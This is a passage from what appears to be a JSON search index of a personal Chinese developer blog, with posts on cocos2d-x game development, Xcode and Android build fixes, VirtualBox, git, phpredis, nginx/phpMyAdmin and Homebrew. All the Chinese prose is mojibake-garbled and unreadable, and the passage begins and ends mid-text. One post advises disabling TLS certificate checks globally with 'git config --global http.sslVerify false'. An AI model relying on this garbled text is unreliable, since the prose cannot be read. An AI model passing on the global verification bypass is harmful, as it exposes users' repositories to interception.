ç„¶åæ…¢æ…¢çš„æ…¢æ…¢çš„å…³æ³¨çš„é—®é¢˜å°±å˜æˆäº†æ€ä¹ˆèµšé’±, å‘¨è¾¹çš„å†…å®¹å„ç§æ”¹åŠ¨, å•†åº—, é“å…·æ”¹äº†åˆæ”¹. ç®—äº†ä¸€ä¸‹, å…¶å®æ¸¸æˆçš„æ ¸å¿ƒå†…å®¹å¼€å‘çš„æ—¶é—´åŠ èµ·æ¥4ä¸ªæœˆéƒ½ä¸åˆ°, æˆ‘ä»¬åˆ°åº•åœ¨åšä»€ä¹ˆ? ç°å®å’Œç†æƒ³çš„åŒºåˆ«è¿˜æ˜¯æ¯”è¾ƒå¤§çš„. æˆ‘ä¹Ÿä¸€ç›´åœ¨çº³é—·ä¸ºä»€ä¹ˆå›½äººå°±åšä¸å‡ºåƒçºªå¿µç¢‘è°·è¿™æ ·çš„æ¸¸æˆâ€¦\n###In the end,###\næ¸¸æˆcbtä¹‹å, å…¶å®èƒ½æ„Ÿè§‰åˆ°ç­–åˆ’åŒå­¦å¿ƒä¸åœ¨ç„‰å·²ç»æœ‰ä¸€æ®µæ—¶é—´äº†. è¿™å°±æ„å‘³ç€æ¸¸æˆçš„å¼€å‘ä¹Ÿè¦å‘Šä¸€æ®µè½äº†. åªæ˜¯æ²¡æƒ³åˆ°ä¼šè¿™ä¹ˆå¿«åˆ°æ¥. androidç‰ˆæœ¬ä¸Šçº¿ä¹‹åçš„æ•°æ®å¹¶ä¸æ˜¯å¾ˆç†æƒ³(å…¶å®æ˜¯èµšçš„é’±ä¸æ˜¯å¾ˆç†æƒ³), ä¸æ¨å¹¿æ¸¸æˆæ˜¯è‚¯å®šæ˜¯ä¸è¡Œçš„, ä½†æ˜¯æ¨å¹¿çš„çš„æˆæœ¬èƒ½ä¸èƒ½èµšå›æ¥å°±æ˜¯ä¸ªé—®é¢˜äº†, ä¸èµšé’±æ˜¯ä¸ªç¡¬ä¼¤å•Š.. ç„¶åå°±æ²¡æœ‰ç„¶åäº†\u0026hellip;\nå¯¹äºå…¬å¸æ¥è¯´, å‡ ä¸ªäººåšäº†ä¸€æŠŠå°è¯•, ä¹ŸåŸ¹å…»äº†äººæ‰, æ²¡ä»€ä¹ˆæŸå¤±, å¯¹äºæˆ‘ä»¬æ¥è¯´ä¹Ÿæ˜¯, ä»0å¼€å§‹å­¦äº†ä¸å°‘ä¸œè¥¿, ä¹Ÿç§¯ç´¯äº†ä¸å°‘ç»éªŒ. æ²¡æœ‰åƒå…¶ä»–é¡¹ç›®ç»„æœ‰kpiè¿½ç€ç»å¸¸æ²¡æ—¥æ²¡å¤œçš„åŠ ç­. æ—¥å­è¿‡çš„è¿˜ç®—é€é¥. åªæ˜¯å°±è¿™æ ·åŒ†åŒ†çš„ç»“æŸäº†, éš¾å…æœ‰äº›å‡„å‡‰. æ¯•ç«Ÿè¿™æ˜¯æˆ‘å¼€å‘çš„ç¬¬ä¸€ä¸ªæ¸¸æˆ, æ€»æƒ³ç€æœ‰å§‹æœ‰ç»ˆ. æˆ‘ä»¬æ˜¯ç©ç€æ¸¸æˆé•¿å¤§çš„ä¸€ä»£äºº, å°æ—¶å€™ä¹Ÿæ€»æƒ³ç€æœ‰ä¸€å¤©èƒ½è‡ªå·±äº²è‡ªå¼€å‘ä¸€ä¸ªæ¸¸æˆ, ä¹Ÿç®—å®ç°äº†ä¸€ä¸ªå¿ƒæ„¿å§.\nå¥½å§, å°±åˆ°è¿™é‡Œäº†. è¿™å°±æ˜¯æˆ‘çš„ç¬¬ä¸€ä¸ªæ¸¸æˆçš„å¼€å‘å†ç¨‹äº†.\né™„ä¸Šæ¸¸æˆçš„ä¸‹è½½é“¾æ¥:\nGoogle Play Store(å°æ¹¾åœ°åŒº): link\nè¯è¯´googleçš„åˆ†åŒºå¤ªæ¶å¿ƒäº†, ç»™ä¸ªapké“¾æ¥å§ link\nApp Store: link\n","date":"2015-01-22T00:00:00Z","permalink":"https://hitian.info/post/my-first-game/","title":"æˆ‘çš„ç¬¬ä¸€ä¸ªæ¸¸æˆå¼€å‘å†ç¨‹"},{"content":"ç¯å¢ƒ cocos2d-x 2.2.2 + js\næ¸¸æˆçš„æŸäº›åŠŸèƒ½ç•Œé¢åœ¨Androidå‡ºç°äº†å¾ˆå¥‡æ€ªçš„é»‘å—, LOGè®°å½•åˆ°\nE/libEGL (30687): call to OpenGL ES API with no current context (logged once per thread)\ngoogleä¸€ä¸‹, å¤§æ¦‚çš„åŸå› å¯èƒ½æ˜¯åœ¨éUIçº¿ç¨‹ä¸Šæ“ä½œåœºæ™¯ä¸Šçš„å›¾ç‰‡èµ„æºå¯¼è‡´çš„. ä½†æ˜¯ç½‘ä¸Šçš„æƒ…å†µç»å¤§å¤šæ•°æƒ…å†µå‡ºç°åœ¨ java æ“ä½œ c++ å±‚æ—¶å‡ºç°çš„, è€Œæˆ‘ä»¬æ˜¯ç›´æ¥å‡ºç°åœ¨jsçš„å›è°ƒæ–¹æ³•ä¸­.\nå›è°ƒæ˜¯ç”±æŸsdkæ‰§è¡Œçš„, é€šè¿‡ java -\u0026gt; c++ -\u0026gt; js ä¸€å±‚å±‚å›æ¥çš„.\nä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆjsçš„å›è°ƒæœ‰å¯èƒ½æ˜¯æ‰§è¡Œåœ¨éuiçº¿ç¨‹é‡Œçš„, æ‰€ä»¥åœ¨è¿™é‡Œæ›´æ–°ç•Œé¢æœ‰å¯èƒ½ä¼šå‡ºç°é—®é¢˜.\nå›§\u0026hellip;\næ¨æµ‹\njsæ— æ³•å†³å®šè‡ªå·±è¿è¡Œåœ¨ä»€ä¹ˆçº¿ç¨‹é‡Œ, ä½†æ˜¯å¯ä»¥æ§åˆ¶ç•Œé¢æ›´æ–°åœ¨UIçº¿ç¨‹é‡Œæ“ä½œ.\næˆ‘ä»¬çš„æµç¨‹æ˜¯è¿™æ ·çš„.\nsdk -\u0026gt; someService -\u0026gt; controller -\u0026gt; view\né‚£å…¶å®æˆ‘ä»¬å¯ä»¥æ‰“æ–­someService å’Œ controller ä¹‹é—´çš„ç›´æ¥è°ƒç”¨å…³ç³». åˆ†æˆä¸¤æ­¥æ¥æ‰§è¡Œ.\nsdk -\u0026gt; someService -\u0026gt; [write status mark \u0026amp; store params]\nå†™å®ŒçŠ¶æ€å°±å¯ä»¥ç›´æ¥è¿”å›äº†. å‰©ä¸‹çš„äº‹æƒ…ç”±æ¸¸æˆçš„å¾ªç¯æ¥åš. æ¸¸æˆçš„å¾ªç¯æœ¬æ¥å°±æ˜¯è´Ÿè´£ç•Œé¢æ›´æ–°çš„, æ‰€ä»¥è‚¯å®šä¸ä¼šæœ‰é—®é¢˜.\ngameloop -\u0026gt; [check status mark \u0026amp; do it]\nå¯ä»¥é‡‡ç”¨åœ¨æ¸¸æˆå¾ªç¯é‡Œå»é‡å¤æ£€æµ‹éœ€è¦æ‰§è¡Œçš„æ–¹æ³•. å½“ç„¶å¦‚æœåªæ˜¯ä¸€æ¬¡è°ƒç”¨æœ€çœèµ„æºçš„è¿˜æ˜¯ç›´æ¥ç”¨cocos2d-x æä¾›çš„schedulerç›¸å…³çš„æ–¹æ³•.\nandroidåœ¨æ¸¸æˆå¼€å‘æ–¹é¢çš„è¡¨ç°ç¡®å®å¾ˆå¥‡è‘©, åŠ ä¸ŠæŸäº›ä¸å¼€æºçš„SDK, ä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜å°±å¾ˆéš¾é¢„æµ‹äº†, ä¸ºäº†ä»¥é˜²ä¸‡ä¸€, ç”šè‡³å¯ä»¥åœ¨someService -\u0026gt; controller ä¹‹å‰åŠ ä¸€ä¸ªçš„æ“ä½œé˜Ÿåˆ—æ¥å½»åº•éš”ç¦»æœ‰å¯èƒ½åœ¨é”™è¯¯çš„çº¿ç¨‹æ‰§è¡Œçš„é—®é¢˜.\n","date":"2014-09-05T00:00:00Z","permalink":"https://hitian.info/post/cocos2d-x-android-call-to-opengl-es-api-with-no-current-context/","title":"cocos2d-x å‡ºç° call to OpenGL ES API with no current context"},{"content":"ç¯å¢ƒ cocos2d-x 2.2.2 + js\nä¾‹å¦‚ä¸€ä¸ªè¿™æ ·çš„ç•Œé¢\nå·¦ä¸Šè§’çš„è®¾ç½®ä½¿ç”¨ cc.MenuItemSprite, å¼¹å‡ºçš„é®ç½©å±‚å’Œä¸Šé¢çš„æŒ‰é’®éœ€è¦ä¼˜å…ˆè·å–touchäº‹ä»¶, å¹¶é˜»æ­¢å‘åç»§ç»­ä¼ æ’­.\nè¿™é‡Œéœ€è¦ä¸¤ä¸ªç‚¹å°±å¯ä»¥åšåˆ°.\nvar bgLayer = cc.LayerColor.extend({ ctor: function () { this._super(); cc.associateWithNative(this, cc.LayerColor); cc.registerTargetedDelegate(-129, true, this); //1.è®¾ç½®è§¦æ‘¸çš„ä¼˜å…ˆçº§ this.setTouchEnabled(true); }, onTouchBegan: function (touches, event) { cc.log(\u0026#34;TouchBegan: \u0026#34;); return true; //2. åœ¨onTouchXXX å›è°ƒé‡Œè¿”å›trueæ¥åå™¬æ‰touchäº‹ä»¶ }, onTouchesBegan: function (touches, event) { var loc = touches[0].getLocation(); cc.log(\u0026#34;TouchesBegan: \u0026#34; + loc.x + \u0026#34; : \u0026#34; + loc.y); return true; } }); 1.è®¾ç½®è§¦æ‘¸çš„ä¼˜å…ˆçº§ åœ¨layeråˆ›å»ºçš„æ—¶å€™ä½¿ç”¨ cc.registerTargetedDelegate(-129, true, this); æ¥è®¾ç½®ä¼˜å…ˆçº§(ç¬¬1ä¸ªå‚æ•°)\nè¿™é‡Œçš„æ•°å­—è¶Šå°, ä¼˜å…ˆçº§è¶Šé«˜,\nå¦å¤–è¦æ³¨æ„çš„æ˜¯ MenuItem çš„ä¼˜å…ˆçº§æ˜¯-128, æ‰€ä»¥è¦é®æŒ¡ä¸Šä¸Šé¢çš„è®¾ç½®æŒ‰é’®, é®ç›–å±‚çš„ä¼˜å…ˆçº§å¿…é¡»å°äºå®ƒ.\n2.åœ¨onTouchXXX å›è°ƒé‡Œè¿”å›trueæ¥åå™¬æ‰touchäº‹ä»¶. è¿™é‡Œæ³¨æ„ä¸æ˜¯ onTouchesXXX, çœ‹äº†ä¸‹c++çš„è¯´æ˜, å› ä¸ºå¤šç‚¹çš„è§¦æ‘¸ä½¿ç”¨çš„StandardDelegateå¹¶æ²¡æœ‰åƒæ‰è¯¥äº‹ä»¶çš„ç›¸å…³å‚æ•°, æ‰€ä»¥åœ¨onTouchesXXX é‡Œ return true æ˜¯æ²¡æœ‰ç”¨çš„.\nPS ä¹‹å‰ä¸€ç›´ç”¨çš„onTouchesXXX æ¥å¤„ç†è§¦æ‘¸çš„, æ²¡å‘ç°å±…ç„¶ä¸ä¸€æ ·, è¿™ä¸ªé—®é¢˜æŠ˜è…¾äº†2ä¸ªå¤šå°æ—¶, apié‡Œæ²¡æœ‰, ç½‘ä¸ŠæŸ¥åˆ°çš„å„ç§è¯´æ˜éƒ½æ˜¯c++çš„. å‘å•Š\u0026hellip;\n","date":"2014-04-02T00:00:00Z","permalink":"https://hitian.info/post/cocos2d-x-touch-layer-block/","title":"cocos2d-x2.2.2 è§¦æ‘¸äº‹ä»¶çš„é®æŒ¡"},{"content":"iOS7.1å‘å¸ƒä¹‹åXcodeä¹Ÿæ›´æ–°åˆ°5.1äº†, ç„¶åä¹‹å‰çš„ç¨‹åºå°±è·‘ä¸èµ·æ¥äº†. ç½‘ä¸Šæ‰¾çš„è§£å†³.\nå¦‚æœå‡ºç°\nUnknown register name 'q0' in asm\nè¯·å‚ç…§ http://stackoverflow.com/questions/21510187/unknown-register-name-q0-in-asm\nå°† neon_matrix_impl.c ä¸­çš„ #if defined(ARM_NEON) ä¿®æ”¹ä¸º #if defined(_ARM_ARCH_7)\nå¦å¤–å‡ºç°çš„\nEAGLView.mm:408:18: Cast from pointer to smaller type 'int' loses information\nå¯ä»¥å‚ç…§ http://www.cocoachina.com/bbs/read.php?tid=193991#902811 5æ¥¼ç»™å‡ºçš„æ–¹æ¡ˆä¿®æ”¹ Targetsâ€”\u0026gt;Build Settingsâ€”\u0026gt;Architectures çš„é…ç½®, å°†64bitçš„ç»™å»æ‰.\nPS. çªç„¶è§‰å¾—ä½œä¸ºåˆšå¼€å§‹å…¥é—¨çš„æ–°æ‰‹, è¿˜æ˜¯å¾—è°¨æ…å‡çº§. ç‰¹åˆ«æ˜¯è§£é‡Šå‹è„šæœ¬è¯­è¨€ç”¨ä¹ æƒ¯, å¤„ç†ç¼–è¯‘é—®é¢˜çœŸå¤´å¤§.\n","date":"2014-03-15T00:00:00Z","permalink":"https://hitian.info/post/xcode5.1-cocos2d-x-error/","title":"cocos2d-x2.2.2åœ¨xcode5.1ä¸‹ç¼–è¯‘é—®é¢˜ä¸´æ—¶è§£å†³"},{"content":"é¦–å…ˆcocos2d-xå¼€å‘æ¸¸æˆç¡®å®è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„. å› ä¸ºå¯ä»¥ä½¿ç”¨jsä½œä¸ºå¼€å‘è¯­è¨€, æœ¬æ¥å°±ä¼šjsçš„äººå…¥é—¨ä¼šæ›´å¿«, ä¸è¿‡å¸‚é¢ä¸Šçš„ä¹¦å’Œç½‘ä¸Šçš„å„ç§æ•™ç¨‹åŸºæœ¬éƒ½æ˜¯ç”¨c++çš„, æ‰€ä»¥å­¦ä¹ è¿‡ç¨‹ä¸­è¿˜æ˜¯èµ°äº†ä¸å°‘å¼¯è·¯.\nç›®å‰ä½¿ç”¨jsä½œä¸ºå¼€å‘è¯­è¨€çš„è¯, å¯ä»¥åœ¨iOS, Android, Windows ä¸Šè¿è¡Œ, å¼€å‘ç¯å¢ƒå¯ä»¥æ˜¯MacOS+Xcode æˆ–è€…Windows+VS, ä¸è¿‡Windowsä¸Šé‚£æ˜¯éå¸¸çš„æ…¢. æ‰€ä»¥ä¸‹é¢çš„éƒ½æ˜¯åœ¨Macä¸‹çš„.\nå¼€å§‹äº†\u0026hellip;\nå®˜ç½‘: http://www.cocos2d-x.org/ å¦‚æœå¾ˆæ…¢è¯·å°è¯•ä½¿ç”¨ä»£ç†\n##apiæ–‡æ¡£##\nå®˜æ–¹apiæ–‡æ¡£åœ°å€\u0026raquo;\nå¯¹apiçš„ä½¿ç”¨å»ºè®®: å¦‚æœæ˜¯ä½¿ç”¨jså¼€å‘æ‰‹æœºnativeçš„æ¸¸æˆçš„è¯, å¯ä»¥ä½¿ç”¨Cocos2d-html5 çš„apiæ–‡æ¡£é…åˆCocos2d-Xçš„æ–‡æ¡£çœ‹, å› ä¸ºCocos2d-xçš„æ–‡æ¡£ä¸»è¦ä»¥c++çš„ä¸ºä¸», çœ‹jsçš„è¯ç”¨èµ·æ¥éå¸¸çš„ä¸æ–¹ä¾¿, æ‰€ä»¥æˆ‘å¹³æ—¶éƒ½æ˜¯ç›´æ¥çœ‹html5çš„, æœ‰é—®é¢˜çš„è¯å†æŸ¥ä¸€ä¸‹c++çš„.\n##åˆ›å»ºé¡¹ç›®##\nè¿™æ˜¯ç¬¬ä¸€ä¸ªå‘, ç›®å‰çš„ç¨³å®šç‰ˆæœ¬æ˜¯2.2.2. å¤§éƒ¨åˆ†ä¹¦è¿˜æ˜¯2.2çš„ç‰ˆæœ¬, ä¹¦é‡Œä»‹ç»çš„å¯¼å…¥xcodeæ¨¡æ¿çš„è„šæœ¬ç°åœ¨å·²ç»æ²¡æœ‰äº†, ç°åœ¨éœ€è¦æ‰§è¡Œè„šæœ¬ç›´æ¥ç”Ÿæˆå·¥ç¨‹.\nè„šæœ¬åœ°å€ cocos2d-x-2.2.2/tools/project-creator/create_project.py\nå»ºè®®ä½¿ç”¨ python2.7 æ¥æ‰§è¡Œ, æœ€æ–°ç‰ˆçš„pythonè²Œä¼¼æœ‰é—®é¢˜\nç›´æ¥æ‰§è¡Œä¼šæœ‰å‚æ•°çš„æç¤º, æŠŠå‚æ•°éƒ½è¡¥ä¸Šå†æ‰§è¡Œä¸€éé¡¹ç›®å°±åº”è¯¥åˆ›å»ºå¥½äº†.\nç”Ÿæˆçš„é¡¹ç›®ä¼šæ”¾åœ¨ cocos2d-x-2.2.2/projects/ ç›®å½•ä¸‹. iOSçš„xcodeå·¥ç¨‹åœ¨ proj.ios ä¸‹é¢. è¦è¿è¡Œéå¸¸ç®€å•, ç›´æ¥åœ¨Xcodeé‡Œç‚¹è¿è¡Œå°±å¯ä»¥ç›´æ¥åœ¨æ¨¡æ‹Ÿå™¨ä¸Šè¿è¡Œè‡ªå¸¦çš„HelloWorldç¨‹åºäº†. androidçš„è¿è¡Œå¯èƒ½è¦ç¨å¾®éº»çƒ¦ä¸€ç‚¹, å¯ä»¥è‡ªè¡ŒGoogle.\n##å­¦ä¹ ##\nå› ä¸ºè¿™æ–¹é¢çš„èµ„æ–™å¤§éƒ¨åˆ†éƒ½æ˜¯c++çš„, æ‰€ä»¥å­¦ä¹ ä¹ŸåŸºæœ¬æ˜¯ä»çœ‹c++çš„ä¹¦å¼€å§‹, å…¶å®ä¹Ÿä¸ç”¨ä¼šc++, çœ‹ä¹¦ä¸»è¦æ˜¯ä¸ºäº†å¤§æ¦‚çŸ¥é“cocos2d-xæ˜¯å¦‚ä½•å·¥ä½œçš„, éƒ½æœ‰ä»€ä¹ˆæ ·çš„æ–¹æ³•æˆ–è€…å·¥å…·å¯ä»¥ä½¿ç”¨, æ¥ä¸‹æ¥å°±æ˜¯çœ‹æºä»£ç åŒ…é‡Œæä¾›çš„jsçš„ç¤ºä¾‹é¡¹ç›®, çœ‹ä¸€ä¸‹jsæ˜¯æ€ä¹ˆå®ç°å„ç§åŠŸèƒ½çš„.\nå®˜æ–¹ç»™äº†5ä¸ªjsçš„ç¤ºä¾‹é¡¹ç›®, åœ¨ç›®å½•: cocos2d-x-2.2.2/samples/Javascript/ ä¸‹, æ³¨æ„jsçš„æºä»£ç æ”¾åœ¨å…¬ç”¨çš„ cocos2d-x-2.2.2/samples/Javascript/Shared/games ç›®å½•ä¸‹. è®¤çœŸç ”ç©¶ä¸€ä¸‹è¿™äº›ä»£ç , åœ¨é…åˆapiæ–‡æ¡£åŸºæœ¬ä¸Šå°±å¯ä»¥å¼€å§‹å°è¯•ç€å¼€å‘è‡ªå·±çš„æ¸¸æˆäº†. å…¥é—¨è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„.\n","date":"2014-03-13T00:00:00Z","permalink":"https://hitian.info/post/cocos2d-x-note/","title":"cocos2d-x å…¥é—¨ç¬”è®°"},{"content":"virtualbox ä¼šè‡ªåŠ¨åŒæ­¥è™šæ‹Ÿæœºçš„æ—¶é—´, çœ‹èµ·æ¥å¾ˆæ–¹ä¾¿, å´ç»™å¼€å‘é€ æˆäº†ä¸å°çš„éº»çƒ¦.\ncmdè¿›å…¥virtualboxçš„ç›®å½• ,ä¸€èˆ¬åœ¨\nC:\\Program Files\\Oracle\\VirtualBox\\\nç½‘ä¸Šè¯´å‘½ä»¤çš„æ ¼å¼ä¸º\nvboxmanage setextradata \u0026lt;vmname\u0026gt; \u0026quot;VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled\u0026quot; \u0026quot;1\u0026quot;\nçœ‹äº†ä¸‹è¯´æ˜. å¦‚æœæ‡’å¾—å»æ‰¾ , å¯ä»¥ä½¿ç”¨global ç›´æ¥ä¿®æ”¹å…¨å±€çš„é…ç½®\næ‰§è¡Œ\n./vboxmanage.exe setextradata global \u0026quot;VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled\u0026quot; \u0026quot;1\u0026quot;\nç„¶åé‡å¯è™šæ‹Ÿæœºå®æµ‹å¯¹guestæ˜¯linux çš„æœ‰æ•ˆ\n","date":"2013-09-20T00:00:00Z","permalink":"https://hitian.info/post/virtualbox-disable-time-sync/","title":"virtualbox ç¦æ­¢æ—¶é—´åŒæ­¥"},{"content":"å°†è‡ªå·±çš„gitæœåŠ¡å™¨åˆ‡æ¢åˆ°httpsåcloneæ—¶å‘ç”Ÿé”™è¯¯\nerror: SSL certificate problem, verify that the CA cert is OK. Details: error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failed while accessing https://... å› ä¸ºè¯ä¹¦æ˜¯è‡ªå·±é¢å‘çš„æ— æ³•é€šè¿‡CAçš„æ ¡éªŒ\ngit config --global http.sslVerify false\nè¿™æ ·å°±å¯ä»¥å¿½ç•¥æ ¡éªŒäº†.\nè¯è¯´gitlabç‰ˆæœ¬ä»5.2å‡çº§åˆ°5.3è¿˜çœŸé¡ºåˆ©, å‡çº§æ–‡æ¡£:Â https://github.com/gitlabhq/gitlabhq/blob/master/doc/update/5.2-to-5.3.md\n","date":"2013-06-23T00:00:00Z","permalink":"https://hitian.info/post/git-ignore-certificate-check/","title":"è®¾ç½®gitå¿½ç•¥æœåŠ¡å™¨è¯ä¹¦æ ¡éªŒé”™è¯¯"},{"content":"æ ¹æ® http://redis.io çš„è¯´æ˜ï¼Œ redisæ”¯æŒ stringï¼Œ listï¼Œ setï¼Œ sorted set å’Œ hash è¿™äº”ç§æ•°æ®ç±»å‹ï¼Œ phpä¸­å¯èƒ½ç»å¸¸éœ€è¦ç›´æ¥æŠŠarray ç›´æ¥å­˜èµ·æ¥ã€‚\nä»”ç»†çœ‹äº†ä¸‹Â https://github.com/nicolasff/phpredis ä¸Šçš„è¯´æ˜ï¼Œ å…¶å®æœ‰ä¸ªæ–¹æ³•setOption å¯ä»¥è®¾ç½®å®¢æˆ·ç«¯çš„ä¸€äº›å±æ€§\n\u0026lt;?php $redis-\u0026gt;setOption(Redis::OPT_SERIALIZER, Redis::SERIALIZER_PHP); // use built-in serialize/unserialize è¿™æ ·å°±å¯ä»¥ä½¿ç”¨phpå†…ç½®çš„serialize/unserialize æ–¹æ³•å¯¹æ•°æ®è¿›è¡Œå¤„ç†\n\u0026lt;?php /** * redis test * @author jia.tian@me.com */ $redis = new Redis(); $redis-\u0026gt;connect(\u0026#39;127.0.0.1\u0026#39;, \u0026#39;6379\u0026#39;); $redis-\u0026gt;setOption(Redis::OPT_SERIALIZER, Redis::SERIALIZER_PHP); $redis-\u0026gt;set(\u0026#39;tian\u0026#39;, array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;tian\u0026#39;, \u0026#39;passwd\u0026#39; =\u0026gt; \u0026#39;123456\u0026#39;)); var_dump($redis-\u0026gt;get(\u0026#39;tian\u0026#39;)); $redis-\u0026gt;set(\u0026#39;tian\u0026#39;, \u0026#39;test\u0026#39;); var_dump($redis-\u0026gt;get(\u0026#39;tian\u0026#39;)); è¿è¡Œç»“æœï¼š\narray(2) { [\u0026quot;name\u0026quot;]=\u0026gt; string(4) \u0026quot;tian\u0026quot; [\u0026quot;passwd\u0026quot;]=\u0026gt; string(6) \u0026quot;123456\u0026quot; } string(4) \u0026quot;test\u0026quot;\nå¯ä»¥çœ‹åˆ°å°†arrayå­˜å…¥å’Œå–å‡ºæ—¶ä¼šè‡ªåŠ¨è¿›è¡Œäº†å¤„ç†è¿™æ˜¯ç›´æ¥åœ¨githubä¸Šä¸‹è½½çš„zipåŒ…åœ¨ubuntuä¸Šå®‰è£…çš„ï¼Œå¯ä»¥çœ‹åˆ°ç‰ˆæœ¬å·æ˜¯2.2.2\nå› ä¸ºå…¬å¸ç”µè„‘æ˜¯winç¯å¢ƒï¼Œ æ‰¾äº†ä¸ªwinçš„redisæ‰©å±•ï¼Œä½†æ˜¯åœ¨setOptionè¿™æ­¥æœ‰ç‚¹éº»çƒ¦ï¼Œ åªè¦ä¸€è®¾ç½®å°±ç™½å±ã€‚ åŸå› ä»åœ¨æµ‹è¯•ä¸­ã€‚ã€‚ã€‚\npsï¼šé¡¹ç›®ç»ˆäºè¦å¼€å§‹å¤§é‡ä½¿ç”¨redisäº†ï¼Œ èƒ½åˆ°è¿™ä¸€å¤©çœŸä¸å®¹æ˜“å•Šã€‚\n","date":"2013-04-12T00:00:00Z","permalink":"https://hitian.info/post/redis-notes/","title":"redisä½¿ç”¨ç¬”è®°"},{"content":"æ·»åŠ phpmyadmin alias\nlocation /phpmyadmin { root /usr/share/; index index.php index.html index.htm; location ~ ^/phpmyadmin/(.+\\.php)$ { try_files $uri =404; root /usr/share/; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include /etc/nginx/fastcgi_params; } location ~* ^/phpmyadmin/(.+\\.(jpg|jpeg|gif|css|png|js|ico|html|xml|txt))$ { root /usr/share/; } } é™æ€æ–‡ä»¶ç¼“å­˜ï¼Œ å¹¶ä¸”ä¸è®°å½•æ—¥å¿—\nlocation ~ \\.(jpg|jpeg|gif|css|png|js|ico|xml)$ { access_log off; expires 30d; } ","date":"2013-04-04T00:00:00Z","permalink":"https://hitian.info/post/nginx-notes/","title":"nginx ä½¿ç”¨ç¬”è®°"},{"content":"ä¿®æ”¹Â ~/.android/adb_usb.ini æ–‡ä»¶\næ·»åŠ \n0x2207\næ³¨æ„æ–‡ä»¶ä¸­ä¸èƒ½æœ‰ç©ºè¡Œ, å¦åˆ™å¯èƒ½æŠ¥é”™:\n* daemon not running. starting it now on port 5037 * ADB server didn\u0026#39;t ACK * failed to start daemon * æ–‡ä»¶ä¿®æ”¹å¥½åé‡å¯ä¸€ä¸‹æœåŠ¡\ntianMac:platform-tools tian$ ./adb kill-server tianMac:platform-tools tian$ ./adb start-server * daemon not running. starting it now on port 5037 * * daemon started successfully * ç„¶ååº”è¯¥å°±å¯ä»¥çœ‹è§è®¾å¤‡äº†.\n","date":"2013-02-24T00:00:00Z","permalink":"https://hitian.info/post/adb-connect-to-rk30sdk/","title":"adbè¿æ¥åˆ°rk30sdk"},{"content":"ä»Šå¤©å®‰è£…subversionçš„è¿‡ç¨‹ä¸­æŠŠhttpdå¸æ‰äº†ï¼Œ ç»“æœé‡æ–°å®‰è£…çš„æ—¶å€™å‘ç”Ÿé”™è¯¯äº†\ntian-mac:~ tian$ brew install httpd ==\u0026gt; Downloading http://www.apache.org/dist/httpd/httpd-2.2.22.tar.bz2 Already downloaded: /Library/Caches/Homebrew/httpd-2.2.22.tar.bz2 ==\u0026gt; ./configure --prefix=/usr/local/Cellar/httpd/2.2.22 --mandir=/usr/local/Cellar/httpd/2.2.22/share/man --enable-layout=GNU --enable-mods-shared=all --with-ssl=/usr --wit checking whether to enable mod_substitute... shared (all) checking whether to enable mod_charset_lite... no checking whether to enable mod_deflate... checking dependencies checking for zlib location... not found checking whether to enable mod_deflate... configure: error: mod_deflate has been requested but can not be built due to prerequisite failures READ THIS: https://github.com/mxcl/homebrew/wiki/troubleshooting These open issues may also help: https://github.com/mxcl/homebrew/issues/14884 çœ‹äº†ä¸€ä¸‹ zlib å·²ç»å®‰è£…äº†ï¼Œ æ‰€ä»¥ç¼–è¾‘ä¸€ä¸‹å®‰è£…çš„è„šæœ¬åŠ ä¸Šzlibçš„è·¯å¾„\nbrew edit httpd\nåŠ ä¸Šä¸€è¡Œ --with-z=/usr/local/opt/zlib/\ndef install system \u0026#34;./configure\u0026#34;, \u0026#34;--disable-debug\u0026#34;, \u0026#34;--disable-dependency-tracking\u0026#34;, \u0026#34;--prefix=#{prefix}\u0026#34;, \u0026#34;--mandir=#{man}\u0026#34;, \u0026#34;--enable-layout=GNU\u0026#34;, \u0026#34;--enable-mods-shared=all\u0026#34;, \u0026#34;--with-ssl=/usr\u0026#34;, \u0026#34;--with-z=/usr/local/opt/zlib/\u0026#34;, \u0026#34;--with-mpm=prefork\u0026#34;, \u0026#34;--disable-unique-id\u0026#34;, \u0026#34;--enable-ssl\u0026#34;, \u0026#34;--enable-dav\u0026#34;, \u0026#34;--enable-cache\u0026#34;, \u0026#34;--enable-proxy\u0026#34;, \u0026#34;--enable-logio\u0026#34;, \u0026#34;--enable-deflate\u0026#34;, \u0026#34;--with-included-apr\u0026#34;, \u0026#34;--enable-cgi\u0026#34;, \u0026#34;--enable-cgid\u0026#34;, \u0026#34;--enable-suexec\u0026#34;, \u0026#34;--enable-rewrite\u0026#34; system \u0026#34;make\u0026#34; system \u0026#34;make install\u0026#34; end é‡æ–°å®‰è£…ä¸€ä¸‹å°±å¥½äº†ã€‚\n","date":"2012-12-30T00:00:00Z","permalink":"https://hitian.info/post/brew-install-httpd/","title":"brew install httpd å‘ç”Ÿé”™è¯¯"},{"content":"é»˜è®¤çš„ç™½åº•é»‘å­—å…¶å®çœ‹ä¹…äº†ä¹ŸæŒºçƒ¦ï¼Œ æ— å¥ˆå®¡ç¾å¤ªå·®ï¼Œ è‡ªå·±è°ƒé¢œè‰²åªä¼šè¶Šå¼„è¶Šå·®ã€‚\næ— æ„ä¸­å‘ç°äº†è¿™ä¸ªä¸œè¥¿ï¼Œ æ¢ä¸»é¢˜å°±å¾ˆæ–¹ä¾¿äº†\né€‰æ‹© Install New Softwareâ€¦ æ–°å¢ä¸€ä¸ª\nhttp://eclipse-color-theme.github.com/update/\nç„¶åå®‰è£…é‡Œé¢çš„ Eclipse Color Theme\né‡å¯ä¹‹åå°±å¯ä»¥çœ‹åˆ°äº†\nè¦æ¢ä¸»é¢˜ä¼šéå¸¸æ–¹ä¾¿ã€‚\nps: è‡ªä»å®‰è£…äº†sublime text ä¹‹åï¼Œ å¯¹å®ƒçš„é…è‰²ä¸€ç›´å¿µå¿µä¸å¿˜ã€‚ã€‚ã€‚\n","date":"2012-12-01T00:00:00Z","permalink":"https://hitian.info/post/zendstudio-install-theme/","title":"æ¨èä¸€ä¸ªzendstudioè°ƒæ ·å¼çš„æ–°æ–¹å¼"},{"content":"ä¹ 